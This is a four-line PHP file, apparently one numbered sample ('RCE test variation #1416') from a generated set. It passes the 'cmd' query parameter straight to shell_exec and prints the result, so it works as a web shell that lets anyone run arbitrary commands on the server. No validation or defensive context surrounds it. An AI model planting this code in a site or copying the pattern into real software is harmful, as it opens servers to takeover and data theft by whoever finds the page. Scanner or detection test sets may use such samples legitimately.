<?php
// RCE test variation #1416
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>